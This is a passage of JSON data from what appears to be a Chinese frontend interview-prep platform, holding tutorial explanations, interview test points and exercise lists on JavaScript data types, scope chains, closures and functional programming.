```\n\n### 12. **内存管理**\n   - **垃圾回收**：JavaScript 的内存管理和垃圾回收机制，考察点可能包括内存泄漏的常见原因及如何避免。\n\n### 13. **性能考虑**\n   - **数据类型对性能的影响**：如何选择合适的数据类型以优化代码性能。\n\n### 14. **类型安全**\n   - **TypeScript 和类型检查**：对于使用 TypeScript 的考察点，可能涉及类型安全、接口和类型注解等内容。",
    "exerciseKeyList": "[\"675f2f01-6304-49e6-aacc-71d754fcb7d4\",\"6d66ddb0-f53a-4286-b5e1-bf7ca3bcd34e\",\"c25081e4-6374-4e78-abec-1a31999e528e\",\"149adb7b-11b7-4cc2-be36-f36b38d36f81\",\"244485d8-3c96-4f52-88d7-7ac0c76b5e0b\",\"62bf96e4-7471-44d1-9c30-d22ccb98e1d3\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 0,
    "createAt": "2024-10-01T08:53:39.000Z",
    "updateAt": "2025-07-16T11:52:35.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "149adb7b-11b7-4cc2-be36-f36b38d36f81",
        "title": "TypeScript 的内置数据类型有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-07T15:18:19.000Z",
        "updateAt": "2024-08-10T17:05:16.000Z"
      },
      {
        "exerciseKey": "244485d8-3c96-4f52-88d7-7ac0c76b5e0b",
        "title": "JavaScript中的简单数据类型有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:44:43.000Z",
        "updateAt": "2024-07-22T15:41:05.000Z"
      },
      {
        "exerciseKey": "62bf96e4-7471-44d1-9c30-d22ccb98e1d3",
        "title": "什么是BigInt?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:59:07.000Z",
        "updateAt": "2021-07-07T00:14:22.000Z"
      },
      {
        "exerciseKey": "675f2f01-6304-49e6-aacc-71d754fcb7d4",
        "title": "详细讲一下 Symbol 数据类型特征与实际使用案例？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:26:15.000Z"
      },
      {
        "exerciseKey": "6d66ddb0-f53a-4286-b5e1-bf7ca3bcd34e",
        "title": "如何让 Proxy 去监听基本数据类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:09:00.000Z",
        "updateAt": "2024-07-19T08:52:01.000Z"
      },
      {
        "exerciseKey": "c25081e4-6374-4e78-abec-1a31999e528e",
        "title": "写一个返回数据类型的函数，要求自定义的类实例化的对象返回定义的类名",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-26T01:19:07.000Z",
        "updateAt": "2024-08-10T17:06:34.000Z"
      }
    ]
  },
  "14": {
    "id": 14,
    "tagId": 10,
    "title": "作用域链与闭包",
    "explanation": "![攻克闭包难题](https://static.ecool.fun//others/377f1fa7-c4c3-4842-b0f4-f6a1c4b8edca.png)  \n初学JavaScript的时候，我在学习闭包上，走了很多弯路。而这次重新回过头来对基础知识进行梳理，要讲清楚闭包，也是一个非常大的挑战。\n\n闭包有多重要？如果你是初入前端的朋友，我没有办法直观的告诉你闭包在实际开发中的无处不在，但是我可以告诉你，**前端面试，必问闭包**。面试官们常常用对闭包的了解程度来判定面试者的基础水平，保守估计，10个前端面试者，至少5个都死在闭包上。\n\n可是为什么，闭包如此重要，还是有那么多人没有搞清楚呢？是因为大家不愿意学习吗？还真不是，而是我们通过搜索找到的大部分讲解闭包的中文文章，都没有清晰明了的把闭包讲解清楚。要么浅尝辄止，要么高深莫测，要么干脆就直接乱说一通。包括我自己曾经也写过一篇关于闭包的总结，回头一看，不忍直视[捂脸]。\n\n因此本文的目的就在于，能够清晰明了得把闭包说清楚，让读者朋友们看了之后，就把闭包给彻底学会了，而不是似懂非懂。\n\n##### 一、作用域与作用域链\n在详细讲解作用域链之前，我默认你已经大概明白了JavaScript中的下面这些重要概念。这些概念将会非常有帮助。\n\n+ 基础数据类型与引用数据类型\n+ 内存空间\n+ 垃圾回收机制\n+ 执行上下文\n+ 变量对象与活动对象\n\n如果你暂时还没有明白，可以去看本系列的前三篇文章，本文文末有目录链接。为了讲解闭包，已经为大家做好了基础知识的铺垫哦。\n\n**作用域**\n\n+ 在JavaScript中，我们可以将作用域定义为一套规则,这套规则用来管理引擎如何在当前作用域以及嵌套的子作用域中根据标识符名称进行变量查找。\n\n> 这里的标识符，指的是变量名或者函数名\n>\n\n+ JavaScript中只有全局作用域与函数作用域(因为eval我们平时开发中几乎不会用到它，这里不讨论)。\n+ 作用域与执行上下文是完全不同的两个概念。我知道很多人会混淆他们，但是一定要仔细区分。\n\n> JavaScript代码的整个执行过程，分为两个阶段，代码编译阶段与代码执行阶段。编译阶段由编译器完成，将代码翻译成可执行代码，这个阶段作用域规则会确定。执行阶段由引擎完成，主要任务是执行可执行代码，执行上下文在这个阶段创建。\n>\n\n![过程](https://static.ecool.fun//others/d6ec1f61-3b4b-470e-b0c2-88888ce50ba1.png)\n\n**作用域链**\n\n回顾一下，我们分析过的执行上下文的生命周期，如下图： \n![执行上下文生命周期](https://static.ecool.fun//others/c288bd21-1108-423a-bc5e-c7a7a8a20b25.png)\n\n我们知道函数在调用激活时，会开始创建对应的执行上下文，在执行上下文生成的过程中，变量对象，作用域链，以及this的值会分别被确定。之前一篇文章我们详细说明了变量对象，而这里，我们将详细说明作用域链。\n\n**作用域链，是由当前环境与上层环境的一系列变量对象组成，它保证了当前执行环境对符合访问权限的变量和函数的有序访问。**\n\n为了帮助大家理解作用域链，我我们先结合一个例子，以及相应的图示来说明。\n\n```javascript\nvar a = 20;\n\nfunction test() {\n    var b = a + 10;\n\n    function innerTest() {\n        var c = 10;\n        return b + c;\n    }\n\n    return innerTest();\n}\n\ntest();\n```\n\n在上面的例子中，全局，函数test，函数innerTest的执行上下文先后创建。我们设定他们的变量对象分别为VO(global)，VO(test), VO(innerTest)。而innerTest的作用域链，则同时包含了这三个变量对象，所以innerTest的执行上下文可如下表示。\n\n```javascript\ninnerTestEC = {\n    VO: {...},  // 变量对象\n    scopeChain: [VO(innerTest), VO(test), VO(global)], // 作用域链\n}\n```\n\n我们可以直接用一个数组来表示作用域链，数组的第一项scopeChain[0]为作用域链的最前端，而数组的最后一项，为作用域链的最末端，所有的最末端都为全局变量对象。\n\n很多人会误解为当前作用域与上层作用域为包含关系，但其实并不是。以最前端为起点，最末端为终点的单方向通道我认为是更加贴切的形容。如图。\n\n![作用域链图示](https://static.ecool.fun//others/349cc5f3-7858-4338-b180-777b29a203f6.png)\n\n> 注意，因为变量对象在执行上下文进入执行阶段时，就变成了活动对象，这一点在上一篇文章中已经讲过，因此图中使用了AO来表示。Active Object\n>\n\n是的，作用域链是由一系列变量对象组成，我们可以在这个单向通道中，查询变量对象中的标识符，这样就可以访问到上一层作用域中的变量了。\n\n##### 二、闭包\n对于那些有一点 JavaScript 使用经验但从未真正理解闭包概念的人来说，理解闭包可以看作是某种意义上的重生，突破闭包的瓶颈可以使你功力大增。\n\n**闭包是一种特殊的对象。**\n\n**它由两部分组成。执行上下文(代号A)，以及在该执行上下文中创建的函数（代号B）。**\n\n**当B执行时，如果访问了A中变量对象中的值，那么闭包就会产生。**\n\n**在大多数理解中，包括许多著名的书籍，文章里都以函数B的名字代指这里生成的闭包。而在chrome中，则以执行上下文A的函数名代指闭包。**\n\n因此我们只需要知道，一个闭包对象，由A、B共同组成，在以后的篇幅中，我将以chrome的标准来称呼。\n\n```javascript\n// demo01\nfunction foo() {\n    var a = 20;\n    var b = 30;\n\n    function bar() {\n        return a + b;\n    }\n\n    return bar;\n}\n\nvar bar = foo();\nbar();\n```\n\n上面的例子，首先有执行上下文foo，在foo中定义了函数bar，而通过对外返回bar的方式让bar得以执行。当bar执行时，访问了foo内部的变量a，b。因此这个时候闭包产生。\n\n在基础进阶（一）中，我总结了JavaScript的垃圾回收机制。JavaScript拥有自动的垃圾回收机制，关于垃圾回收机制，有一个重要的行为，那就是，当一个值，在内存中失去引用时，垃圾回收机制会根据特殊的算法找到它，并将其回收，释放内存。\n\n而我们知道，函数的执行上下文，在执行完毕之后，生命周期结束，那么该函数的执行上下文就会失去引用。其占用的内存空间很快就会被垃圾回收器释放。可是闭包的存在，会阻止这一过程。\n\n先来一个简单的例子。\n\n```javascript\nvar fn = null;\nfunction foo() {\n    var a = 2;\n    function innnerFoo() {\n        console.log(a);\n    }\n    fn = innnerFoo; // 将 innnerFoo的引用，赋值给全局变量中的fn\n}\n\nfunction bar() {\n    fn(); // 此处的保留的innerFoo的引用\n}\n\nfoo();\nbar(); // 2\n```\n\n在上面的例子中，`foo()`执行完毕之后，按照常理，其执行环境生命周期会结束，所占内存被垃圾收集器释放。但是通过`fn = innerFoo`，函数innerFoo的引用被保留了下来，复制给了全局变量fn。这个行为，导致了foo的变量对象，也被保留了下来。于是，函数fn在函数bar内部执行时，依然可以访问这个被保留下来的变量对象。所以此刻仍然能够访问到变量a的值。\n\n这样，我们就可以称foo为闭包。\n\n下图展示了闭包foo的作用域链。\n\n![闭包foo的作用域链，图中标题写错了，请无视](https://static.ecool.fun//others/377f1fa7-c4c3-4842-b0f4-f6a1c4b8edca.png)\n\n我们可以在chrome浏览器的开发者工具中查看这段代码运行时产生的函数调用栈与作用域链的生成情况。如下图。\n\n> 关于如何在chrome中观察闭包，以及更多闭包的例子，请阅读基础系列（六）\n>\n\n![从图中可以看出，chrome浏览器认为闭包是foo，而不是通常我们认为的innerFoo](https://static.ecool.fun//others/5551e63f-9170-4e04-a777-7d9294c550fb.png)\n\n在上面的图中，红色箭头所指的正是闭包。其中Call Stack为当前的函数调用栈，Scope为当前正在被执行的函数的作用域链，Local为当前的局部变量。\n\n**所以，通过闭包，我们可以在其他的执行上下文中，访问到函数的内部变量。**比如在上面的例子中，我们在函数bar的执行环境中访问到了函数foo的a变量。个人认为，从应用层面，这是闭包最重要的特性。利用这个特性，我们可以实现很多有意思的东西。\n\n不过读者朋友们需要注意的是，虽然例子中的闭包被保存在了全局变量中，但是闭包的作用域链并不会发生任何改变。在闭包中，能访问到的变量，仍然是作用域链上能够查询到的变量。\n\n对上面的例子稍作修改，如果我们在函数bar中声明一个变量c，并在闭包fn中试图访问该变量，运行结果会抛出错误。\n\n```javascript\nvar fn = null;\nfunction foo() {\n    var a = 2;\n    function innnerFoo() {\n        console.log(c); // 在这里，试图访问函数bar中的c变量，会抛出错误\n        console.log(a);\n    }\n    fn = innnerFoo; // 将 innnerFoo的引用，赋值给全局变量中的fn\n}\n\nfunction bar() {\n    var c = 100;\n    fn(); // 此处的保留的innerFoo的引用\n}\n\nfoo();\nbar();\n```\n\n> 关于这一点，很多同学把函数调用栈与作用域链没有分清楚，所以有的大神看了我关于介绍执行上下文的文章时就义正言辞的说我的例子有问题，而这些评论有很大的误导作用，为了帮助大家自己拥有能够辨别的能力，所以我写了基础（六），教大家如何在chrome中观察闭包，作用域链，this等。当然我也不敢100%保证我文中的例子就一定正确，所以教大家如何去辨认我认为才是最重要的。\n>\n\n**闭包的应用场景**\n\n除了面试，在实践中，闭包有两个非常重要的应用场景。分别是模块化与柯里化。\n\n+ 柯里化\n\n在函数式编程中，利用闭包能够实现很多炫酷的功能，柯里化便是其中很重要的一种。点击了解更多关于柯里化的知识\n\n+ 模块\n\n在我看来，模块是闭包最强大的一个应用场景。如果你是初学者，对于模块的了解可以暂时不用放在心上，因为理解模块需要更多的基础知识。但是如果你已经有了很多JavaScript的使用经验，在彻底了解了闭包之后，不妨借助本文介绍的作用域链与闭包的思路，重新理一理关于模块的知识。这对于我们理解各种各样的设计模式具有莫大的帮助。\n\n```javascript\n(function () {\n    var a = 10;\n    var b = 20;\n\n    function add(num1, num2) {\n        var num1 = !!num1 ? num1 : a;\n        var num2 = !!num2 ? num2 : b;\n\n        return num1 + num2;\n    }\n\n    window.add = add;\n})();\n\nadd(10, 20);\n```\n\n在上面的例子中，我使用函数自执行的方式，创建了一个模块。add是模块对外暴露的一个公共方法。而变量a，b被作为私有变量。在面向对象的开发中，我们常常需要考虑是将变量作为私有变量，还是放在构造函数中的this中，因此理解闭包，以及原型链是一个非常重要的事情。模块十分重要，因此我会在以后的文章专门介绍，这里就暂时不多说啦。\n\n![此图中可以观看到当代码执行到add方法时的调用栈与作用域链，此刻的闭包为外层的自执行函数](https://static.ecool.fun//others/05f35a0b-bbb8-4407-9689-026c7dc81aee.png)\n\n为了验证自己有没有搞懂作用域链与闭包，这里留下一个经典的思考题，常常也会在面试中被问到。\n\n利用闭包，修改下面的代码，让循环输出的结果依次为1， 2， 3， 4， 5\n\n```javascript\nfor (var i=1; i<=5; i++) {\n    setTimeout( function timer() {\n        console.log(i);\n    }, i*1000 );\n}\n```\n\n",
    "testPoint": "### 1. **作用域链的定义与工作机制**\n   - 你能解释什么是作用域链吗？它是如何在 JavaScript 中工作的？\n   - 当一个变量在当前作用域中找不到时，JavaScript 是如何沿着作用域链查找的？它会找到什么为止？\n\n### 2. **执行上下文与作用域链的关系**\n   - 作用域链如何与执行上下文的创建过程关联？在函数执行时，作用域链是如何形成的？\n   - 嵌套函数如何影响作用域链？举个例子说明。\n\n### 3. **全局作用域和局部作用域**\n   - 全局作用域和局部作用域对作用域链的构成有何影响？\n   - 为什么在全局作用域声明的变量会出现在所有作用域链中？\n\n### 4. **闭包的定义与原理**\n   - 什么是闭包？能否用通俗的语言解释一下闭包的工作原理？\n   - 闭包是如何访问其外部函数作用域中的变量的？为什么外部函数执行结束后变量仍然存在？\n\n### 5. **闭包的使用场景**\n   - 请举例说明闭包的常见使用场景，比如数据封装、回调函数、和计数器等。\n   - 你在项目中用闭包解决过什么实际问题？它是如何帮助你实现特定功能的？\n\n### 6. **闭包的内存管理与性能**\n   - 闭包可能导致什么样的内存问题？为什么有些闭包会导致内存泄漏？\n   - 如何在使用闭包时避免不必要的内存消耗？有什么具体的清理方式？\n\n### 7. **调试作用域链与闭包**\n   - 当作用域链出现预期之外的变量引用时，你会如何调试或排查问题？\n   - 请描述你在项目中遇到的一个闭包相关的问题，以及你是如何利用对作用域链和闭包的理解来解决它的。\n\n### 8. **块级作用域与闭包**\n   - ES6 引入了 `let` 和 `const`，它们对闭包和作用域链有何影响？\n   - 请解释如何利用 `let` 和 `const` 避免 `var` 声明中常见的闭包陷阱。\n",
    "exerciseKeyList": "[\"e9bcc1f4-1b0a-4213-9d3a-8e64c97c7848\",\"f1a76998-d6bd-487e-ae2e-06a045f8e7aa\",\"fa224d36-147a-4251-8033-dc1462e9527e\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 6,
    "createAt": "2024-10-01T12:13:20.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "e9bcc1f4-1b0a-4213-9d3a-8e64c97c7848",
        "title": "说说你对闭包的理解，以及闭包使用场景",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:49:17.000Z",
        "updateAt": "2024-08-10T17:04:29.000Z"
      },
      {
        "exerciseKey": "f1a76998-d6bd-487e-ae2e-06a045f8e7aa",
        "title": "说说你对 React Hook的闭包陷阱的理解，有哪些解决方案？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:43:00.000Z",
        "updateAt": "2024-09-03T13:08:02.000Z"
      },
      {
        "exerciseKey": "fa224d36-147a-4251-8033-dc1462e9527e",
        "title": "什么是作用域链？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:49:48.000Z",
        "updateAt": "2024-08-10T17:04:30.000Z"
      }
    ]
  },
  "15": {
    "id": 15,
    "tagId": 10,
    "title": "函数与函数式编程",
    "explanation": "纵观JavaScript中所有必须需要掌握的重点知识中，函数是我们在初学的时候最容易忽视的一个知识点。在学习的过程中，可能会有很多人、很多文章告诉你面向对象很重要，原型很重要，可是却很少有人告诉你，面向对象中所有的重点难点，几乎都与函数息息相关。\n\n包括之前几篇文章介绍的执行上下文，变量对象，闭包，this等，都是围绕函数的细节来展开。\n\n很多人在学习中，很急切的希望自己快一点开始学习面向对象，学习模块，学习流行框架，然后迅速成为高手。但是我可以很负责的告诉你，关于函数的这些基础东西没理解到一定程度，那么你的学习进展一定是举步维艰的。\n\n所以，大家一定要重视函数！\n\n\n\n当然，关于函数的重点，难点在前面几篇文章都已经说得差不多了，这篇文章主要总结一下函数的基础知识，并初步学习函数式编程的思维。\n\n\n\n##### 一、函数声明、函数表达式、匿名函数与自执行函数\n\n\n关于函数在实际开发中的应用，大体可以总结为函数声明、函数表达式、匿名函数、自执行函数。\n\n\n\n**函数声明**\n\n\n\n我们知道，JavaScript中，有两种声明方式，一个是使用`var`的变量声明，另一个是使用`function`的函数声明。\n\n\n\n在前端基础进阶（三）：变量对象详解中我有提到过，变量对象的创建过程中，函数声明比变量声明具有更为优先的执行顺序，即我们常常提到的函数声明提前。因此我们在执行上下文中，无论在什么位置声明了函数，我们都可以在同一个执行上下文中直接使用该函数。\n\n\n\n```javascript\nfn();  // function\n\nfunction fn() {\n    console.log('function');\n}\n```\n\n\n\n**函数表达式**\n\n\n\n与函数声明不同，函数表达式使用了var进行声明，那么我们在确认他是否可以正确使用的时候就必须依照var的规则进行判断，即变量声明。我们知道使用var进行变量声明，其实是进行了两步操作。\n\n\n\n```javascript\n// 变量声明\nvar a = 20;\n\n// 实际执行顺序\nvar a = undefined;  // 变量声明，初始值undefined，变量提升，提升顺序次于function声明\na = 20;  // 变量赋值，该操作不会提升\n```\n\n\n\n同样的道理，当我们使用变量声明的方式来声明函数时，就是我们常常说的函数表达式。函数表达的提升方式与变量声明一致。\n\n\n\n```javascript\nfn(); // 报错\nvar fn = function() {\n    console.log('function');\n}\n```\n\n\n\n上例子的执行顺序为：\n\n\n\n```javascript\nvar fn = undefined;   // 变量声明提升\nfn();    // 执行报错\nfn = function() {   // 赋值操作，此时将后边函数的引用赋值给fn\n    console.log('function');\n}\n```\n\n\n\n> 因此，由于声明方式的不同，导致了函数声明与函数表达式在使用上的一些差异需要我们注意，除此之外，这两种形式的函数在使用上并无不同。\n>\n\n\n\n关于上面例子中，函数表达式中的赋值操作，在其他一些地方也会被经常使用，我们清楚其中的关系即可。\n\n\n\n```javascript\n在构造函数中添加方法\nfunction Person(name) {\n    this.name = name;\n    this.age = age;\n    // 在构造函数内部中添加方法\n    this.getAge = function() {\n        return this.age;\n    }\n    this.\n}\n// 给原型添加方法\nPerson.prototype.getName = function() {\n    return this.name;\n}\n\n// 在对象中添加方法\nvar a = {\n    m: 20,\n    getM: function() {\n        return this.m;\n    }\n}\n```\n\n\n\n**匿名函数**\n\n\n\n在上面我们大概讲述了函数表达式中的赋值操作。而匿名函数，顾名思义，就是指的没有被显示进行赋值操作的函数。它的使用场景，多作为一个参数传入另一个函数中。\n\n\n\n```javascript\nvar a = 10;\nvar fn = function(bar, num) {\n    return bar() + num;\n}\n\nfn(function() {\n    return a;\n}, 20)\n```\n\n\n\n在上面的例子中，fn的第一个参数传入了一个匿名函数。虽然该匿名函数没有显示的进行赋值操作，我们没有办法在外部执行上下文中引用到它，但是在fn函数内部，我们将该匿名函数赋值给了变量bar，保存在了fn变量对象的arguments对象中。\n\n\n\n```javascript\n// 变量对象在fn上下文执行过程中的创建阶段\nVO(fn) = {\n    arguments: {\n        bar: undefined,\n        num: undefined,\n        length: 2\n    }\n}\n\n// 变量对象在fn上下文执行过程中的执行阶段\n// 变量对象变为活动对象，并完成赋值操作与执行可执行代码\nVO -> AO\n\nAO(fn) = {\n    arguments: {\n        bar: function() { return a },\n        num: 20,\n        length: 2\n    }\n}\n```\n\n\n\n由于匿名函数传入另一个函数之后，最终会在另一个函数中执行，因此我们也常常称这个匿名函数为**回调函数**。关于匿名函数更多的内容，我会在下一篇深入探讨柯里化的文章中进行更加详细讲解。\n\n\n\n**匿名函数的这个应用场景几乎承担了函数的所有难以理解的知识点**，因此我们一定要对它的这些细节了解的足够清楚，如果对于变量对象的演变过程你还看不太明白，一定要回过头去看这篇文章：前端基础进阶（三）：变量对象详解\n\n\n\n**函数自执行与块级作用域**\n\n\n\n在ES5中，没有块级作用域，因此我们常常使用函数自执行的方式来模仿块级作用域，这样就提供了一个独立的执行上下文，结合闭包，就为模块化提供了基础。而函数自执行，其实是匿名函数的一种应用。\n\n\n\n```javascript\n(function() {\n   // ...\n})();\n```\n\n\n\n一个模块往往可以包括：私有变量、私有方法、公有变量、公有方法。\n\n\n\n根据作用域链的单向访问，外面可能很容易知道在这个独立的模块中，外部执行环境是无法访问内部的任何变量与方法的，因此我们可以很容易的创建属于这个模块的私有变量与私有方法。\n\n\n\n```javascript\n(function() {\n    // 私有变量\n    var age = 20;\n    var name = 'Tom';\n\n    // 私有方法\n    function getName() {\n        return `your name is ` + name;\n    }\n})();\n```\n\n\n\n但是共有方法和变量应该怎么办？大家还记得我们前面讲到过的**闭包**的特性吗？没错，利用闭包，我们可以访问到执行上下文内部的变量和方法，因此，我们只需要根据闭包的定义，创建一个闭包，将你认为需要公开的变量和方法开放出来即可。\n\n\n\n> 如果你对闭包了解不够，前端基础进阶（四）：详细图解作用域链与闭包应该可以帮到你。\n>\n\n\n\n```javascript\n(function() {\n    // 私有变量\n    var age = 20;\n    var name = 'Tom';\n\n    // 私有方法\n    function getName() {\n        return `your name is ` + name;\n    }\n\n    // 共有方法\n    function getAge() {\n        return age;\n    }\n\n    // 将引用保存在外部执行环境的变量中，形成闭包，防止该执行环境被垃圾回收\n    window.getAge = getAge;\n})();\n```\n\n\n\n当然，闭包在模块中的重要作用，我们也在讲解闭包的时候已经强调过，但是这个知识点真的太重要，需要我们反复理解并且彻底掌握，因此为了帮助大家进一步理解闭包，我们来看看jQuery中，是如何利用我们模块与闭包的。\n\n\n\n```javascript\n// 使用函数自执行的方式创建模块\n(function(window, undefined) {\n\n    // 声明jQuery构造函数\n     var jQuery = function(name) {\n\n        // 主动在构造函数中，返回一个jQuery实例\n         return new jQuery.fn.init(name);\n     }\n\n    // 添加原型方法\n     jQuery.prototype = jQuery.fn = {\n         constructor: jQuery,\n         init:function() { ... },\n         css: function() { ... }\n     }\n     jQuery.fn.init.prototype = jQuery.fn;\n\n    // 将jQuery改名为$，并将引用保存在window上，形成闭包，对外开发jQuery构造函数，这样我们就可以访问所有挂载在jQuery原型上的方法了\n     window.jQuery = window.$ = jQuery;\n })(window);\n\n// 在使用时，我们直接执行了构造函数，因为在jQuery的构造函数中通过一些手段，返回的是jQuery的实例，所以我们就不用再每次用的时候在自己new了\n$('#div1');\n```\n\n\n\n在这里，我们只需要看懂闭包与模块的部分就行了，至于内部的原型链是如何绕的，为什么会这样写，我在讲面向对象的时候会为大家慢慢分析。举这个例子的目的所在，就是希望大家能够重视函数，因为在实际开发中，它无处不在。\n\n\n\n接下来我要分享一个高级的，非常有用的模块的应用。当我们的项目越来越大，那么需要保存的数据与状态就越来越多，因此，我们需要一个专门的模块来维护这些数据，这个时候，有一个叫做状态管理器的东西就应运而生。对于状态管理器，最出名的，我想非redux莫属了。虽然对于还在学习中的大家来说，redux是一个有点高深莫测的东西，但是在我们学习之前，可以先通过简单的方式，让大家大致了解状态管理器的实现原理，为我们未来的学习奠定坚实的基础。\n\n\n\n先来直接看代码。\n\n\n\n```javascript\n// 自执行创建模块\n(function() {\n    // states 结构预览\n    // states = {\n    //     a: 1,\n    //     b: 2,\n    //     m: 30,  \n    //     o: {}\n    // }\n    var states = {};  // 私有变量，用来存储状态与数据\n\n    // 判断数据类型\n    function type(elem) {\n        if(elem == null) {\n            return elem + '';\n        }\n        return toString.call(elem).replace(/[\\[\\]]/g, '').split(' ')[1].toLowerCase();\n    }\n\n\n    /**\n     * @Param name 属性名\n     * @Description 通过属性名获取保存在states中的值\n    */\n    function get(name) {\n        return states[name] ? states[name] : '';\n    }\n\n    function getStates() {\n        return states;\n    }\n\n    /*\n    * @param options {object} 键值对\n    * @param target {object} 属性值为对象的属性，只在函数实现时递归中传入\n    * @desc 通过传入键值对的方式修改state树，使用方式与小程序的data或者react中的setStates类似\n    */\n    function set(options, target) {\n        var keys = Object.keys(options);\n        var o = target ? target : states;\n\n        keys.map(function(item) {\n            if(typeof o[item] == 'undefined') {\n                o[item] = options[item];\n            }\n            else {\n                type(o[item]) == 'object' ? set(options[item], o[item]) : o[item] = options[item];\n            }\n            return item;\n        })\n    }\n\n    // 对外提供接口\n    window.get = get;\n    window.set = set;\n    window.getStates = getStates;\n})()\n\n// 具体使用如下\n\nset({ a: 20 });     // 保存 属性a\nset({ b: 100 });    // 保存属性b\nset({ c: 10 });     // 保存属性c\n\n// 保存属性o, 它的值为一个对象\nset({\n    o: {\n        m: 10,\n        n: 20\n    }\n})\n\n// 修改对象o 的m值\nset({\n    o: {\n        m: 1000\n    }\n})\n\n// 给对象o中增加一个c属性\nset({\n    o: {\n        c: 100\n    }\n})\nconsole.log(getStates())\n```\n\n\n\n[demo实例在线地址](http://codepen.io/yangbo5207/pen/EZzEbY?editors=1111)\n\n\n\n我之所以说这是一个高级应用，是因为在单页应用中，我们很可能会用到这样的思路。根据我们提到过的知识，理解这个例子其实很简单，其中的难点估计就在于set方法的处理上，因为为了具有更多的适用性，因此做了很多适配，用到了递归等知识。如果你暂时看不懂，没有关系，知道如何使用就行了，上面的代码可以直接运用于实际开发。记住，当你需要保存的状态太多的时候，你就想到这一段代码就行了。\n\n\n\n> 函数自执行的方式另外还有其他几种写法，诸如`!function(){}()`，`+function(){}()`\n>\n\n\n\n##### 二、函数参数传递方式：按值传递\n\n\n还记得基本数据类型与引用数据类型在复制上的差异吗？基本数据类型复制，是直接值发生了复制，因此改变后，各自相互不影响。但是引用数据类型的复制，是保存在变量对象中的引用发生了复制，因此复制之后的这两个引用实际访问的实际是同一个堆内存中的值。当改变其中一个时，另外一个自然也被改变。如下例。\n\n\n\n```javascript\nvar a = 20;\nvar b = a;\nb = 10;\nconsole.log(a);  // 20\n\nvar m = { a: 1, b: 2 }\nvar n = m;\nn.a = 5;\nconsole.log(m.a) // 5\n```\n\n\n\n当值作为函数的参数传递进入函数内部时，也有同样的差异。我们知道，函数的参数在进入函数后，实际是被保存在了函数的变量对象中，因此，这个时候相当于发生了一次复制。如下例。\n\n\n\n```javascript\nvar a = 20;\n\nfunction fn(a) {\n    a = a + 10;\n    return a;\n}\nfn(a);\nconsole.log(a); // 20\n```\n\n\n\n```javascript\nvar a = { m: 10, n: 20 }\nfunction fn(a) {\n    a.m = 20;\n    return a;\n}\n\nfn(a);\nconsole.log(a);   // { m: 20, n: 20 }\n```\n\n\n\n正是由于这样的不同，导致了许多人在理解函数参数的传递方式时，就有许多困惑。到底是按值传递还是按引用传递？实际上结论仍然是按值传递，只不过当我们期望传递一个引用类型时，真正传递的，只是这个引用类型保存在变量对象中的引用而已。为了说明这个问题，我们看看下面这个例子。\n\n\n\n```javascript\nvar person = {\n    name: 'Nicholas',\n    age: 20\n}\n\nfunction setName(obj) {  // 传入一个引用\n    obj = {};   // 将传入的引用指向另外的值\n    obj.name = 'Greg';  // 修改引用的name属性\n}\n\nsetName(person);\nconsole.log(person.name);  // Nicholas 未被改变\n```\n\n\n\n在上面的例子中，如果person是按引用传递，那么person就会自动被修改为指向其name属性值为Gerg的新对象。但是我们从结果中看到，person对象并未发生任何改变，因此只是在函数内部引用被修改而已。\n\n\n\n##### 四、函数式编程\n\n\n虽然JavaScript并不是一门纯函数式编程的语言，但是它使用了许多函数式编程的特性。因此了解这些特性可以让我们更加了解自己写的代码。\n\n\n\n当我们想要使用一个函数时，通常情况下其实就是想要将一些功能，逻辑等封装起来。相信大家对于封装这个概念并不陌生。\n\n\n\n我们通常通过函数封装来完成一件事情。例如，我想要计算任意三个数的和，我们就可以将这三个数作为参数，封装一个简单的函数。\n\n\n\n```javascript\nfunction add(a, b, c) {\n  return a + b + c;\n}\n```\n\n\n\n当我们想要计算三个数的和时，直接调用该方法即可。\n\n\n\n```javascript\nadd(1, 2, 3); // 6\n```\n\n\n\n当然，当我们想要做的事情比较简单的时候，可能还看不出来封装成为函数之后带来的便利。如果我们想要做的事情稍微复杂一点呢。例如我想要计算一个数组中的所有子项目的和。\n\n\n\n```javascript\nfunction mergeArr(arr) {\n    var result = 0;\n    for(var i = 0; i < arr.length; i++) { result  += arr[i] }\n    return result;\n}\n```\n\n\n\n如果我们不通过函数封装的方式，那么再每次想要实现这个功能时，就不得不重新使用一次for循环，这样的后果就是我们的代码中充斥着越来越多的重复代码。而封装之后，当我们想要再次做这件事情的时候，只需要一句话就可以了。\n\n\n\n```javascript\nmergeArr([1, 2, 3, 4, 5]);\n```\n\n\n\n当然，我相信大家对于函数封装的意义都应该有非常明确的认知，但是我们要面临的问题是，当我们想要去封装一个函数时，如何做才是最佳实践呢？\n\n\n\n函数式编程能给我们答案。\n\n\n\n我们在初学时，往往会不由自主的使用命令式编程的风格来完成我们想要干的事情。因为命令式编程更加的简单，直白。例如我们现在有一个数组，`array = [1, 3, 'h', 5, 'm', '4']`，现在想要找出这个数组中的所有类型为number的子项。当我们使用命令式编程思维时，可能就会直接这样做。\n\n\n\n```javascript\nvar array = [1, 3, 'h', 5, 'm', '4'];\nvar res = [];\nfor(var i = 0; i < array.length; i ++) {\n    if (typeof array[i] === 'number') {\n        res.push(array[i]);\n    }\n}\n```\n\n\n\n在这种实现方式中，我们平铺直叙的实现了我们的目的。这样做的问题在于，当我们在另外的时刻，想要找出另外一个数组中所有的子项时，我们不得不把同样的逻辑再写一次。当出现次数变多时，我们的代码也变得更加糟糕且难以维护。\n\n\n\n而函数式编程的思维则建议我们将这种会多次出现的功能封装起来以备调用。\n\n\n\n```javascript\nfunction getNumbers(array) {\n    var res = [];\n    array.forEach(function(item) {\n        if (typeof item === 